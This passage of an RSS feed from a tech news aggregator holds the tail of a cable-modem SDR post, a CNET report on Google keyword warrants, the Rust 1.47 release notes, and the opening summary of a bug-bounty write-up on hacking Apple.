&lt;p&gt;Although dropping some data is bad some some applications, it can stream FM radio fairly seamlessly, although the audio has to be slowed down slightly so it is not consumed faster than it is being recieved. I have also been able to be recieved. I have also been able to pick up the 154MHz narrowband FM radio used by the local fire department.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://stdw.github.io/cm-sdr/img/sample.wav&quot;&gt;Here is a short sample of some demodulated audio captured with the modem&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;Although this project was mostly just a challenge to myself and is not intended as a serious SDR, I am satisfied with the results and hope to continue to improve it.&lt;/p&gt;
&lt;p&gt;This quote really resonated with me, so once again in the words of VK4HAT, “With so few firsts available in life, take those that present themselves and have a crack”&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/stdw/cm-sdr&quot;&gt;cm-sdr repo on GitHub&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 08 Oct 2020 15:00:02 +0000</pubDate>
<dc:creator>0x00000000</dc:creator>
<og:title>Reverse engineering my cable modem and turning it into an SDR</og:title>
<og:url>https://stdw.github.io/cm-sdr/</og:url>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://stdw.github.io/cm-sdr/</dc:identifier>
</item>
<item>
<title>Google is giving data to police based on search keywords, court docs show</title>
<link>https://www.cnet.com/news/google-is-giving-data-to-police-based-on-search-keywords-court-docs-show/</link>
<guid isPermaLink="true" >https://www.cnet.com/news/google-is-giving-data-to-police-based-on-search-keywords-court-docs-show/</guid>
<description>&lt;span class=&quot;imageContainer&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://cnet2.cbsistatic.com/img/boz0QPtOYaFI4p2isX13g_kT95o=/1092x0/2020/10/07/b8226f06-6459-4d05-9abe-0fb4a33940c1/gettyimages-1171118333.jpg&quot; class=&quot;&quot; alt=&quot;gettyimages-1171118333&quot; height=&quot;0&quot; width=&quot;1092&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;p&gt;&lt;span class=&quot;caption&quot;&gt;Google is providing information to police based on what people are searching for, including data like IP addresses.&lt;/span&gt;&lt;/p&gt;
&lt;span class=&quot;credit&quot;&gt;Avishek Das/SOPA Images/LightRocket via Getty Images&lt;/span&gt;
&lt;p class=&quot;speakableTextP1&quot;&gt;There are few things as revealing as a person's search history, and police typically need a warrant on a known suspect to demand that sensitive information. But a recently unsealed court document found that investigators can request such data in reverse order by asking Google to disclose everyone who searched a keyword rather than for information on a known suspect.&lt;/p&gt;
&lt;p class=&quot;speakableTextP2&quot;&gt;In August, police arrested Michael Williams, an associate of singer and &lt;a href=&quot;https://www.cbsnews.com/news/r-kelly-arraignment-hearing-singer-to-appear-in-nyc-court-on-federal-sex-abuse-charges-today-2019-08-2/&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot; data-component=&quot;externalLink&quot;&gt;accused sex offender R. Kelly&lt;/a&gt;, for allegedly setting fire to a witness' car in Florida. Investigators linked Williams to the arson, as well as witness tampering, after sending a search warrant to Google that requested information on &quot;users who had searched the address of the residence close in time to the arson.&quot;  &lt;/p&gt;
&lt;div class=&quot;c-reengageNewsletter shortcode hasNewsletter newsletter-subscribe-form desktop broad&quot; data-component=&quot;newsletterAndInterest&quot; data-newsletter-and-interest-options=&quot;{&amp;quot;id&amp;quot;:&amp;quot;303efe12-c4e2-4abd-af02-f99b9d1b2828&amp;quot;,&amp;quot;name&amp;quot;:&amp;quot;GOOGLE&amp;quot;,&amp;quot;type&amp;quot;:&amp;quot;broad&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;Google news and products&amp;quot;,&amp;quot;ecode&amp;quot;:&amp;quot;e192&amp;quot;,&amp;quot;isBroadInterest&amp;quot;:true,&amp;quot;noFollowNoBlockText&amp;quot;:&amp;quot;Subscribe to the Google Report newsletter, receive notifications and see related stories on CNET.&amp;quot;,&amp;quot;noFollowBlockText&amp;quot;:&amp;quot;Subscribe to the Google Report newsletter and see related stories on CNET.&amp;quot;,&amp;quot;FollowNoBlockText&amp;quot;:&amp;quot;Subscribe to the Google Report newsletter and receive notifications.&amp;quot;,&amp;quot;FollowBlockText&amp;quot;:&amp;quot;Subscribe to the Google Report newsletter.&amp;quot;}&quot; readability=&quot;8&quot;&gt;
&lt;h5&gt;For more like this&lt;/h5&gt;
&lt;p&gt;Subscribe to the Google Report newsletter, receive notifications and see related stories on CNET.&lt;/p&gt;

&lt;/div&gt;
&lt;p&gt;The July court filing was unsealed on Tuesday. Detroit News reporter Robert Snell &lt;a href=&quot;https://twitter.com/robertsnellnews/status/1313560399556509698&quot; rel=&quot;noopener noreferrer&quot; target=&quot;_blank&quot; data-component=&quot;externalLink&quot;&gt;tweeted about the filing&lt;/a&gt; after it was unsealed.&lt;/p&gt;
&lt;p&gt;Court documents showed that Google provided the IP addresses of people who searched for the arson victim's address, which investigators tied to a phone number belonging to Williams. Police then used the phone number records to pinpoint the location of Williams' device near the arson, according to court documents. &lt;/p&gt;
&lt;p&gt;The original warrant sent to Google is still sealed, but the report provides another example of a growing trend of data requests to the search engine giant in which investigators demand data on a large group of users rather than a specific request on a single suspect. &lt;/p&gt;
&lt;p&gt;&quot;This 'keyword warrant' evades the Fourth Amendment checks on police surveillance,&quot; said Albert Fox Cahn, the executive director of the Surveillance Technology Oversight Project. &quot;When a court authorizes a data dump of every person who searched for a specific term or address, it's likely unconstitutional.&quot;&lt;/p&gt;
&lt;div class=&quot;shortcode video v2&quot; data-video-playlist=&quot;[{&amp;quot;id&amp;quot;:&amp;quot;aec2a014-1d4c-4598-8931-48897ec4e5dc&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;How to delete your Google history right now&amp;quot;,&amp;quot;description&amp;quot;:&amp;quot;Google recently improved its privacy controls and now makes it easier to understand the information it collects about you.&amp;quot;,&amp;quot;slug&amp;quot;:&amp;quot;how-to-delete-your-google-history-right-now&amp;quot;,&amp;quot;chapters&amp;quot;:{&amp;quot;data&amp;quot;:[],&amp;quot;paging&amp;quot;:{&amp;quot;total&amp;quot;:0,&amp;quot;limit&amp;quot;:15,&amp;quot;offset&amp;quot;:0}},&amp;quot;datePublished&amp;quot;:&amp;quot;2018-05-18 15:53:30&amp;quot;,&amp;quot;duration&amp;quot;:91,&amp;quot;mpxRefId&amp;quot;:&amp;quot;q8EAR87GK0GA85dVkdCIzHWfq3nCUpwS&amp;quot;,&amp;quot;ratingVChip&amp;quot;:&amp;quot;TV-14&amp;quot;,&amp;quot;primaryTopic&amp;quot;:{&amp;quot;id&amp;quot;:&amp;quot;1c1356b9-c387-11e2-8208-0291187b029a&amp;quot;},&amp;quot;author&amp;quot;:{&amp;quot;id&amp;quot;:&amp;quot;8dde6d2c-8176-11e2-9d12-0018fe8a00b0&amp;quot;,&amp;quot;firstName&amp;quot;:&amp;quot;Matt&amp;quot;,&amp;quot;lastName&amp;quot;:&amp;quot;Elliott&amp;quot;},&amp;quot;primaryCollection&amp;quot;:{&amp;quot;id&amp;quot;:&amp;quot;043b8a15-f01d-441a-8401-7db7466c3747&amp;quot;,&amp;quot;title&amp;quot;:&amp;quot;How To Video&amp;quot;},&amp;quot;image&amp;quot;:{&amp;quot;path&amp;quot;:&amp;quot;https:\/\/cnet4.cbsistatic.com\/img\/59xDOF0tCefmRsDbwT8TXHC-TOw=\/1280x720\/2018\/05\/18\/32f2885b-1183-4b9c-a6bb-5baa35444814\/google-image-2.jpg&amp;quot;},&amp;quot;thumbnail&amp;quot;:&amp;quot;https:\/\/cnet3.cbsistatic.com\/img\/YNOmD4sezzQEhfEc_12zlvECTf4=\/194x109\/2018\/05\/18\/32f2885b-1183-4b9c-a6bb-5baa35444814\/google-image-2.jpg&amp;quot;,&amp;quot;closedCaptionPath&amp;quot;:&amp;quot;\/videos\/captions\/webvtt\/how-to-delete-your-google-history-right-now.vtt&amp;quot;,&amp;quot;urlPath&amp;quot;:&amp;quot;\/videos\/how-to-delete-your-google-history-right-now\/&amp;quot;,&amp;quot;isVertical&amp;quot;:false,&amp;quot;m3u8&amp;quot;:&amp;quot;https:\/\/cnetvideo.cbsistatic.com\/vr\/2019\/10\/08\/1236907075622\/157699_hls\/master.m3u8&amp;quot;,&amp;quot;mp4&amp;quot;:&amp;quot;https:\/\/cnetvideo.cbsistatic.com\/vr\/2019\/10\/08\/1236907075622\/Delete_Google_History_FINAL_157698_740.mp4&amp;quot;,&amp;quot;index&amp;quot;:0}]&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;embeddedVideoContainer&quot; tabindex=&quot;0&quot; aria-label=&quot;Play video How to delete your Google history right now&quot; data-load-video=&quot;0&quot; data-video-id=&quot;aec2a014-1d4c-4598-8931-48897ec4e5dc&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;videoContainer&quot;&gt;&lt;img src=&quot;https://cnet3.cbsistatic.com/img/J8CimWm9L_o6ld1oAuM_sKTpP6M=/196x110/2018/05/18/32f2885b-1183-4b9c-a6bb-5baa35444814/google-image-2.jpg&quot; class=&quot;photo&quot; alt=&quot;&quot; height=&quot;110&quot; width=&quot;196&quot;/&gt;&lt;/div&gt;
&lt;p&gt;&lt;span class=&quot;bold&quot;&gt;&lt;span class=&quot;nowPlaying&quot;&gt;Now playing:&lt;/span&gt; &lt;span class=&quot;watchThis&quot;&gt;Watch this:&lt;/span&gt;&lt;/span&gt; How to delete your Google history right now&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;duration&quot;&gt;1:31&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The keyword warrants are similar to &lt;a href=&quot;https://www.cnet.com/news/geofence-warrants-how-police-can-use-protesters-phones-against-them/&quot;&gt;geofence warrants&lt;/a&gt;, in which police make requests to Google for data on all devices logged in at a specific area and time. Google received 15 times more geofence warrant requests in 2018 compared with 2017, and five times more in 2019 than 2018. The rise in reverse requests from police have troubled Google staffers, &lt;a href=&quot;https://www.cnet.com/news/google-court-docs-raise-concerns-on-geofence-warrants-location-tracking/&quot;&gt;according to internal emails&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Google said Thursday that it works to protect the privacy of its users while also supporting law enforcement.&lt;/p&gt;
&lt;p&gt;&quot;We require a warrant and push to narrow the scope of these particular demands when overly broad, including by objecting in court when appropriate,&quot; Google's director of law enforcement and information security, Richard Salgado, said in a statement. &quot;These data demands represent less than 1% of total warrants and a small fraction of the overall legal demands for user data that we currently receive.&quot;&lt;/p&gt;
&lt;p&gt;The company declined to disclose how many keyword warrants it's received in the last three years.&lt;/p&gt;
&lt;h2&gt;Worries about search warrants&lt;br/&gt;&lt;/h2&gt;
&lt;p&gt;Reverse search warrants like geofence warrants are being &lt;a href=&quot;https://www.nacdl.org/Content/United-States-v-Chatrie,-No-3-19-cr-130-(E-D-Va-)&quot; rel=&quot;noopener noreferrer nofollow&quot; target=&quot;_blank&quot; data-component=&quot;externalLink&quot;&gt;challenged across the US&lt;/a&gt; for violating civil rights. Lawmakers in New York have &lt;a href=&quot;https://www.nysenate.gov/legislation/bills/2019/s8183&quot; rel=&quot;noopener noreferrer nofollow&quot; target=&quot;_blank&quot; data-component=&quot;externalLink&quot;&gt;proposed legislation&lt;/a&gt; to make these searches illegal, while in Illinois, a federal judge found that the &lt;a href=&quot;https://static1.squarespace.com/static/5c1bfc7eee175995a4ceb638/t/5f4528d4ef2835252d794bfb/1598367957667/In+the+Matter+of+the+Search+of+Information+Stored+at+Premises+Controlled+by+Google.pdf&quot; rel=&quot;noopener noreferrer nofollow&quot; target=&quot;_blank&quot; data-component=&quot;externalLink&quot;&gt;practice violated the Fourth Amendment&lt;/a&gt;. &lt;/p&gt;
&lt;p&gt;Keyword warrants aren't new. In 2017, &lt;a href=&quot;https://www.documentcloud.org/documents/3519211-Edina-Police-Google-Search-Warrant-Redacted.html&quot; rel=&quot;noopener noreferrer nofollow&quot; target=&quot;_blank&quot; data-component=&quot;externalLink&quot;&gt;Minnesota police sent a keyword warrant&lt;/a&gt; to Google for information including name, address, telephone number, Social Security numbers and IP addresses related to people who searched for a &quot;Douglas [REDACTED]&quot; in a fraud investigation. &lt;/p&gt;
&lt;p&gt;Todd Spodek, the attorney representing Williams, said he plans to challenge the legality of the keyword warrant issued in June. He hasn't seen the document yet but said he intends to argue that it violated Williams' rights. &lt;/p&gt;
&lt;p&gt;Spodek said he's seen more of these types of warrants being issued in criminal investigations and worries it could lead to wrongful accusations in the future. &lt;/p&gt;
&lt;p&gt;&quot;Think of the ramifications in the future if everyone who searched something in the privacy of their own home was subject to interviews by federal agents,&quot; Spodek said. &quot;Someone could be interested in how people die a certain way or how drug deals are done, and it could be misconstrued or used improperly.&quot;&lt;/p&gt;

&lt;p&gt;Typically, probable cause is needed for search warrants, which are associated with a suspect or address. The demands for information are narrowly tailored to a specific individual. Keyword warrants go against that concept by giving up data on a large group of people associated with searching for certain phrases. &lt;/p&gt;
&lt;p&gt;After investigators linked Williams to the arson through the keyword warrant, they sent Google another warrant specifically for his account, finding that he looked up phrases like &quot;where can i buy a .50 custom machine gun,&quot; &quot;witness intimidation&quot; and &quot;countries that don't have extradition with the United States.&quot;  &lt;/p&gt;
&lt;p&gt;This detail was discovered after executing a warrant on Williams, rather than the other way around, in which investigators looked for everyone who searched those phrases. &lt;/p&gt;
&lt;p&gt;Google is also facing criticism for complying with broad data requests such as geofence and keyword searches. &lt;/p&gt;
&lt;p&gt;&quot;If Google stored data in a way that was truly de-identified, then they also couldn't give it to the government,&quot; the Electronic Frontier Foundation's surveillance litigation director Jennifer Lynch said. &quot;Google's not setting up their system or changing their practices in a way that could prevent these kinds of searches.&quot; &lt;/p&gt;
&lt;p&gt;Because of how keyword warrants work, there's concern that innocent people's online activities will be swept up in the requests. People have been arrested for being in the wrong place at the wrong time &lt;a href=&quot;https://www.phoenixnewtimes.com/news/google-geofence-location-data-avondale-wrongful-arrest-molina-gaeta-11426374&quot; rel=&quot;noopener noreferrer nofollow&quot; target=&quot;_blank&quot; data-component=&quot;externalLink&quot;&gt;because of geofence warrants&lt;/a&gt;, and attorneys are now worried it could happen for searching on Google. &lt;/p&gt;
&lt;p&gt;Both Lynch and Spodek said reverse search warrants are being used more and more frequently by police departments, and call the practice unconstitutional. &lt;/p&gt;
&lt;p&gt;&quot;A lot of people could be searching for various terms,&quot; Spodek said. &quot;That alone should not be enough.&quot;&lt;/p&gt;

</description>
<pubDate>Thu, 08 Oct 2020 14:35:45 +0000</pubDate>
<dc:creator>0xmohit</dc:creator>
<og:title>Google is giving data to police based on search keywords, court docs show</og:title>
<og:description>Court records in an arson case show that Google gave away data on people who searched for a specific address.</og:description>
<og:image>https://cnet4.cbsistatic.com/img/YSBh836sJiB9lU_xsOW26s30Hcw=/1200x630/2020/10/07/b8226f06-6459-4d05-9abe-0fb4a33940c1/gettyimages-1171118333.jpg</og:image>
<og:type>article</og:type>
<og:url>https://www.cnet.com/news/google-is-giving-data-to-police-based-on-search-keywords-court-docs-show/</og:url>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnet.com/news/google-is-giving-data-to-police-based-on-search-keywords-court-docs-show/</dc:identifier>
</item>
<item>
<title>Rust 1.47</title>
<link>https://blog.rust-lang.org/2020/10/08/Rust-1.47.html</link>
<guid isPermaLink="true" >https://blog.rust-lang.org/2020/10/08/Rust-1.47.html</guid>
<description>&lt;p&gt;Oct. 8, 2020 · The Rust Release Team&lt;/p&gt;&lt;div readability=&quot;121.52148870182&quot;&gt;
&lt;p&gt;The Rust team is happy to announce a new version of Rust, 1.47.0. Rust is a programming language that is empowering everyone to build reliable and efficient software.&lt;/p&gt;
&lt;p&gt;If you have a previous version of Rust installed via rustup, getting Rust 1.47.0 is as easy as:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-console&quot;&gt;rustup update stable
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;If you don't have it already, you can &lt;a href=&quot;https://www.rust-lang.org/tools/install&quot;&gt;get &lt;code&gt;rustup&lt;/code&gt;&lt;/a&gt; from the appropriate page on our website, and check out the &lt;a href=&quot;https://github.com/rust-lang/rust/blob/master/RELEASES.md#version-1470-2020-10-08&quot;&gt;detailed release notes for 1.47.0&lt;/a&gt; on GitHub.&lt;/p&gt;
&lt;h2&gt;What's in 1.47.0 stable&lt;/h2&gt;
&lt;p&gt;This release contains no new language features, though it does add one long-awaited standard library feature. It is mostly quality of life improvements, library stabilizations and const-ifications, and toolchain improvements. See the &lt;a href=&quot;https://github.com/rust-lang/rust/blob/master/RELEASES.md#version-1470-2020-10-08&quot;&gt;detailed release notes&lt;/a&gt; to learn about other changes not covered by this post.&lt;/p&gt;
&lt;h4&gt;Traits on larger arrays&lt;/h4&gt;
&lt;p&gt;Rust does not currently have a way to be generic over integer values. This has long caused problems with arrays, because arrays have an integer as part of their type; &lt;code&gt;[T; N]&lt;/code&gt; is the type of an array of type &lt;code&gt;T&lt;/code&gt; of &lt;code&gt;N&lt;/code&gt; length. Because there is no way to be generic over &lt;code&gt;N&lt;/code&gt;, you have to manually implement traits for arrays for every &lt;code&gt;N&lt;/code&gt; you want to support. For the standard library, it was decided to support up to &lt;code&gt;N&lt;/code&gt; of 32.&lt;/p&gt;
&lt;p&gt;We have been working on a feature called &quot;const generics&quot; that would allow you to be generic over &lt;code&gt;N&lt;/code&gt;. Fully explaining this feature is out of the scope of this post, because we are not stabilizing const generics just yet. However, the core of this feature has been implemented in the compiler, and it has been decided that the feature is far enough along that we are okay with &lt;a href=&quot;https://github.com/rust-lang/rust/pull/74060/&quot;&gt;the standard library using it to implement traits on arrays of any length&lt;/a&gt;. What this means in practice is that if you try to do something like this on Rust 1.46:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-rust&quot;&gt;fn main() {
    let xs = [0; 34];

    println!(&quot;{:?}&quot;, xs);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;you'd get this error:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-text&quot;&gt;error[E0277]: arrays only have std trait implementations for lengths 0..=32
 --&amp;gt; src/main.rs:4:22
  |
4 |     println!(&quot;{:?}&quot;, xs);
  |                      ^^ the trait `std::array::LengthAtMost32` is not implemented for `[{integer}; 34]`
  |
  = note: required because of the requirements on the impl of `std::fmt::Debug` for `[{integer}; 34]`
  = note: required by `std::fmt::Debug::fmt`
  = note: this error originates in a macro (in Nightly builds, run with -Z macro-backtrace for more info)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;But with Rust 1.47, it will properly print out the array.&lt;/p&gt;
&lt;p&gt;This should make arrays significantly more useful to folks, though it will take until the const generics feature stabilizes for libraries to be able to do this kind of implementation for their own traits. We do not have a current estimated date for the stabilization of const generics.&lt;/p&gt;
&lt;h4&gt;Shorter backtraces&lt;/h4&gt;
&lt;p&gt;Back in Rust 1.18, we &lt;a href=&quot;https://github.com/rust-lang/rust/pull/38165&quot;&gt;made some changes to the backtraces &lt;code&gt;rustc&lt;/code&gt; would print on panic&lt;/a&gt;. There are a number of things in a backtrace that aren't useful the majority of the time. However, at some point, &lt;a href=&quot;https://github.com/rust-lang/rust/issues/47429&quot;&gt;these regressed&lt;/a&gt;. In Rust 1.47.0, the culprit was found, and &lt;a href=&quot;https://github.com/rust-lang/rust/pull/75048&quot;&gt;this has now been fixed&lt;/a&gt;. Since the regression, this program:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-rust&quot;&gt;fn main() {
    panic!();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;would give you a backtrace that looks like this:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-text&quot;&gt;thread 'main' panicked at 'explicit panic', src/main.rs:2:5
stack backtrace:
   0: backtrace::backtrace::libunwind::trace
             at /cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.46/src/backtrace/libunwind.rs:86
   1: backtrace::backtrace::trace_unsynchronized
             at /cargo/registry/src/github.com-1ecc6299db9ec823/backtrace-0.3.46/src/backtrace/mod.rs:66
   2: std::sys_common::backtrace::_print_fmt
             at src/libstd/sys_common/backtrace.rs:78
   3: &amp;lt;std::sys_common::backtrace::_print::DisplayBacktrace as core::fmt::Display&amp;gt;::fmt
             at src/libstd/sys_common/backtrace.rs:59
   4: core::fmt::write
             at src/libcore/fmt/mod.rs:1076
   5: std::io::Write::write_fmt
             at src/libstd/io/mod.rs:1537
   6: std::sys_common::backtrace::_print
             at src/libstd/sys_common/backtrace.rs:62
   7: std::sys_common::backtrace::print
             at src/libstd/sys_common/backtrace.rs:49
   8: std::panicking::default_hook::{{closure}}
             at src/libstd/panicking.rs:198
   9: std::panicking::default_hook
             at src/libstd/panicking.rs:217
  10: std::panicking::rust_panic_with_hook
             at src/libstd/panicking.rs:526
  11: std::panicking::begin_panic
             at /rustc/04488afe34512aa4c33566eb16d8c912a3ae04f9/src/libstd/panicking.rs:456
  12: playground::main
             at src/main.rs:2
  13: std::rt::lang_start::{{closure}}
             at /rustc/04488afe34512aa4c33566eb16d8c912a3ae04f9/src/libstd/rt.rs:67
  14: std::rt::lang_start_internal::{{closure}}
             at src/libstd/rt.rs:52
  15: std::panicking::try::do_call
             at src/libstd/panicking.rs:348
  16: std::panicking::try
             at src/libstd/panicking.rs:325
  17: std::panic::catch_unwind
             at src/libstd/panic.rs:394
  18: std::rt::lang_start_internal
             at src/libstd/rt.rs:51
  19: std::rt::lang_start
             at /rustc/04488afe34512aa4c33566eb16d8c912a3ae04f9/src/libstd/rt.rs:67
  20: main
  21: __libc_start_main
  22: _start
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Now, in Rust 1.47.0, you'll see this instead:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-text&quot;&gt;thread 'main' panicked at 'explicit panic', src/main.rs:2:5
stack backtrace:
   0: std::panicking::begin_panic
             at /rustc/d6646f64790018719caebeafd352a92adfa1d75a/library/std/src/panicking.rs:497
   1: playground::main
             at ./src/main.rs:2
   2: core::ops::function::FnOnce::call_once
             at /rustc/d6646f64790018719caebeafd352a92adfa1d75a/library/core/src/ops/function.rs:227
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;This makes it much easier to see where the panic actually originated, and you can still set &lt;code&gt;RUST_BACKTRACE=full&lt;/code&gt; if you want to see everything.&lt;/p&gt;
&lt;h4&gt;LLVM 11&lt;/h4&gt;
&lt;p&gt;We have &lt;a href=&quot;https://github.com/rust-lang/rust/pull/73526/&quot;&gt;upgraded to LLVM 11&lt;/a&gt;. The compiler still supports being compiled with LLVM versions as old as 8, but by default, 11 is what you'll be getting.&lt;/p&gt;
&lt;h4&gt;Control Flow Guard on Windows&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;rustc&lt;/code&gt; &lt;a href=&quot;https://github.com/rust-lang/rust/pull/73893/&quot;&gt;now supports&lt;/a&gt; &lt;code&gt;-C control-flow-guard&lt;/code&gt;, an option that will turn on &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard&quot;&gt;Control Flow Guard&lt;/a&gt; on Windows. Other platforms ignore this flag.&lt;/p&gt;
&lt;h3&gt;Library changes&lt;/h3&gt;
&lt;p&gt;Additionally, nine new APIs were stabilized this release:&lt;/p&gt;
&lt;p&gt;The following previously stable APIs have now been made &lt;code&gt;const&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/rust-lang/rust/pull/73858/&quot;&gt;The &lt;code&gt;new&lt;/code&gt; method for all &lt;code&gt;NonZero&lt;/code&gt; integers.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rust-lang/rust/pull/73858/&quot;&gt;The &lt;code&gt;checked_add&lt;/code&gt;,&lt;code&gt;checked_sub&lt;/code&gt;,&lt;code&gt;checked_mul&lt;/code&gt;,&lt;code&gt;checked_neg&lt;/code&gt;, &lt;code&gt;checked_shl&lt;/code&gt;, &lt;code&gt;checked_shr&lt;/code&gt;, &lt;code&gt;saturating_add&lt;/code&gt;, &lt;code&gt;saturating_sub&lt;/code&gt;, and &lt;code&gt;saturating_mul&lt;/code&gt; methods for all integers.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rust-lang/rust/pull/73858/&quot;&gt;The &lt;code&gt;checked_abs&lt;/code&gt;, &lt;code&gt;saturating_abs&lt;/code&gt;, &lt;code&gt;saturating_neg&lt;/code&gt;, and &lt;code&gt;signum&lt;/code&gt; for all signed integers.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/rust-lang/rust/pull/73858/&quot;&gt;The &lt;code&gt;is_ascii_alphabetic&lt;/code&gt;, &lt;code&gt;is_ascii_uppercase&lt;/code&gt;, &lt;code&gt;is_ascii_lowercase&lt;/code&gt;, &lt;code&gt;is_ascii_alphanumeric&lt;/code&gt;, &lt;code&gt;is_ascii_digit&lt;/code&gt;, &lt;code&gt;is_ascii_hexdigit&lt;/code&gt;, &lt;code&gt;is_ascii_punctuation&lt;/code&gt;, &lt;code&gt;is_ascii_graphic&lt;/code&gt;, &lt;code&gt;is_ascii_whitespace&lt;/code&gt;, and &lt;code&gt;is_ascii_control&lt;/code&gt; methods for &lt;code&gt;char&lt;/code&gt; and &lt;code&gt;u8&lt;/code&gt;.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;See the &lt;a href=&quot;https://github.com/rust-lang/rust/blob/master/RELEASES.md#version-1470-2020-10-08&quot;&gt;detailed release notes&lt;/a&gt; for more.&lt;/p&gt;
&lt;h3&gt;Other changes&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/rust-lang/rust/pull/71237/&quot;&gt;Rustdoc has gained support for the Ayu theme&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;There are other changes in the Rust 1.47.0 release: check out what changed in &lt;a href=&quot;https://github.com/rust-lang/rust/blob/master/RELEASES.md#version-1470-2020-10-08&quot;&gt;Rust&lt;/a&gt;, &lt;a href=&quot;https://github.com/rust-lang/cargo/blob/master/CHANGELOG.md#cargo-147-2020-10-08&quot;&gt;Cargo&lt;/a&gt;, and &lt;a href=&quot;https://github.com/rust-lang/rust-clippy/blob/master/CHANGELOG.md#rust-147&quot;&gt;Clippy&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Contributors to 1.47.0&lt;/h2&gt;
&lt;p&gt;Many people came together to create Rust 1.47.0. We couldn't have done it without all of you. &lt;a href=&quot;https://thanks.rust-lang.org/rust/1.47.0/&quot;&gt;Thanks!&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Thu, 08 Oct 2020 13:37:04 +0000</pubDate>
<dc:creator>jsheard</dc:creator>
<og:title>Announcing Rust 1.47.0 | Rust Blog</og:title>
<og:description>Empowering everyone to build reliable and efficient software.</og:description>
<og:image>https://www.rust-lang.org/static/images/rust-social-wide.jpg</og:image>
<og:type>website</og:type>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.rust-lang.org/2020/10/08/Rust-1.47.html</dc:identifier>
</item>
<item>
<title>We Hacked Apple for 3 Months</title>
<link>https://samcurry.net/hacking-apple/</link>
<guid isPermaLink="true" >https://samcurry.net/hacking-apple/</guid>
<description>&lt;div class=&quot;fl-builder-content fl-builder-content-1139 fl-builder-content-primary&quot; data-post-id=&quot;1139&quot;&gt;
&lt;div class=&quot;fl-row fl-row-fixed-width fl-row-bg-none fl-node-5f7a8b12ac3c4&quot; data-node=&quot;5f7a8b12ac3c4&quot;&gt;
&lt;div class=&quot;fl-row-content-wrap&quot;&gt;
&lt;div class=&quot;fl-row-content fl-row-fixed-width fl-node-content&quot;&gt;
&lt;div class=&quot;fl-col-group fl-node-5f7a8b12ade9f&quot; data-node=&quot;5f7a8b12ade9f&quot;&gt;
&lt;div class=&quot;fl-col fl-node-5f7a8b12adf23&quot; data-node=&quot;5f7a8b12adf23&quot;&gt;
&lt;div class=&quot;fl-col-content fl-node-content&quot;&gt;
&lt;div class=&quot;fl-module fl-module-rich-text fl-node-5f7a8b12b1356&quot; data-node=&quot;5f7a8b12b1356&quot;&gt;
&lt;div class=&quot;fl-module-content fl-node-content&quot;&gt;
&lt;div class=&quot;fl-rich-text&quot;&gt;
&lt;p&gt;Between the period of July 6th to October 6th myself, Brett Buerhaus, Ben Sadeghipour, Samuel Erb, and Tanner Barnes worked together and hacked on the Apple bug bounty program.&lt;/p&gt;
&lt;p&gt;During our engagement, we found a variety of vulnerabilities in core portions of their infrastructure that would've allowed an attacker to fully compromise both customer and employee applications, launch a worm capable of automatically taking over a victim's iCloud account, retrieve source code for internal Apple projects, fully compromise an industrial control warehouse software used by Apple, and take over the sessions of Apple employees with the capability of accessing management tools and sensitive resources.&lt;/p&gt;
&lt;p&gt;There were a total of 55 vulnerabilities discovered with 11 critical severity, 29 high severity, 13 medium severity, and 2 low severity reports. These severities were assessed by us for summarization purposes and are dependent on a mix of CVSS and our understanding of the business related impact.&lt;/p&gt;
&lt;p&gt;As of October 6th, 2020, the vast majority of these findings have been fixed and credited. They were typically remediated within 1-2 business days (with some being fixed in as little as 4-6 hours).&lt;/p&gt;
&lt;h2&gt;Introduction&lt;/h2&gt;
&lt;p&gt;While scrolling through Twitter sometime around July I noticed a blog post being shared where a researcher was awarded $100,000 from Apple for discovering an authentication bypass that allowed them to arbitrarily access any Apple customer account. This was surprising to me as I previously understood that Apple's bug bounty program only awarded security vulnerabilities affecting their physical products and did not payout for issues affecting their web assets.&lt;/p&gt;
